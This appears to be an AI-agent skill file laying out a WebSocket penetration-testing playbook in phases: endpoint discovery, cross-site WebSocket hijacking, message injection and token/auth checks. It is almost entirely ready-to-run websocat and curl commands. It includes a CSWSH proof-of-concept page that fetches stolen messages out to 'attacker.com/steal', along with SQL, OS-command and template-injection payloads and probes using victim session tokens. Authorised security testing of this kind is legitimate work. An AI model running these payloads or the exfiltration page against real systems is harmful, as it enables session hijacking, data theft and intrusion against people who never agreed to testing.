---
name: vuln-websocket
description: "WebSocket security testing — cross-site WebSocket hijacking (CSWSH), message injection, authentication bypass, SQL/NoSQL/command injection via WebSocket messages, privilege escalation via WebSocket. Triggers: 'websocket', 'websocket security', 'cswsh', 'cross-site websocket hijacking', 'websocket injection', 'ws pentest', 'socket.io security', 'websocket exploit'."
---

# WebSocket Security Testing

Test WebSocket endpoints for CSWSH, injection, and authentication issues.

---

## Phase 1: Discovery & Interception

```bash
TARGET="wss://TARGET"
TARGET_HTTP="https://TARGET"

curl -s "$TARGET_HTTP" | grep -oE '"wss?://[^"]+"' | sort -u | tee output/ws_endpoints.txt
curl -s "$TARGET_HTTP/static/app.js" | grep -oE '"wss?://[^"]+"' | sort -u

curl -s -I -H "Upgrade: websocket" -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  "$TARGET_HTTP/ws" | grep -i "101\|websocket"

# apt install websocat
websocat "$TARGET/ws" --no-close -v 2>&1 | head -20

wscat -c "$TARGET/ws" -x '{"type":"ping"}' 2>&1
```

---

## Phase 2: Cross-Site WebSocket Hijacking (CSWSH)

```bash
TARGET_WS="wss://TARGET/ws"
VICTIM_COOKIE="session=VICTIM_TOKEN"

websocat --no-close "$TARGET_WS" \
  -H "Origin: null" 2>&1 | head -10

websocat --no-close "$TARGET_WS" \
  -H "Origin: https://evil.com" 2>&1 | head -10

cat > output/cswsh_poc.html << 'EOF'
<html>
<script>
var ws = new WebSocket("wss://TARGET/ws");
ws.onopen = function() { ws.send(JSON.stringify({type:"getProfile"})); };
ws.onmessage = function(e) { 
  fetch("https://attacker.com/steal?d=" + encodeURIComponent(e.data)); 
};
</script>
</html>
EOF
```

---

## Phase 3: Message Injection

```bash
TARGET_WS="wss://TARGET/ws"

websocat "$TARGET_WS" <<< '{"action":"search","query":"test OR 1=1--"}'

websocat "$TARGET_WS" <<< '{"action":"ping","host":"127.0.0.1; id"}'

websocat "$TARGET_WS" <<< '{"template":"{{7*7}}"}'

websocat "$TARGET_WS" <<< '{"action":"getAdminData","userId":"admin"}'

websocat "$TARGET_WS" -H "Cookie: session=ATTACKER_SESSION" <<< \
  '{"action":"getMessages","userId":"VICTIM_USER_ID"}'
```

---

## Phase 4: Token/Auth Issues

```bash
TARGET_WS="wss://TARGET/ws"

websocat "$TARGET_WS" --no-close -v <<< '{"type":"getProfile"}' 2>&1

websocat "wss://TARGET/ws?token=VICTIM_TOKEN" <<< '{"type":"getMessages"}'

websocat "$TARGET_WS" -H "Authorization: Bearer EXPIRED_TOKEN" <<< '{"type":"ping"}'
```

---

## Output

Save to `output/`:
- `ws_endpoints.txt` — discovered WebSocket endpoints
- `cswsh_poc.html` — cross-site WebSocket hijacking PoC
- `ws_injection.txt` — successful injection payloads

## Next Phase

→ `vuln-account-takeover` if CSWSH achieves session theft
→ `pentest-report` to document findings
